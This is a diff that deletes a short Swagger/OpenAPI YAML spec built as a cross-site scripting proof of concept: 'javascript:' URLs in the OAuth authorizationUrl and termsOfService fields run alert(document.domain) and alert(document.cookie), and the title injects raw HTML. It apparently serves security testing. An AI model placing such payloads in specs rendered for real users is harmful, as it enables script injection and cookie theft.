@@ -1,16 +1,1 @@
 
-securityDefinitions:
-  a:
-    type: oauth2
-    authorizationUrl: javascript:alert(document.domain)//
-info:
-  version: "0.0.1"
-  title: <h1>nagli</h1>
-  description: Authorize!
-  termsOfService: "javascript:alert(document.cookie)"
-paths:
-  /:
-    get:
-      responses:
-        200:
-          description: Successful response
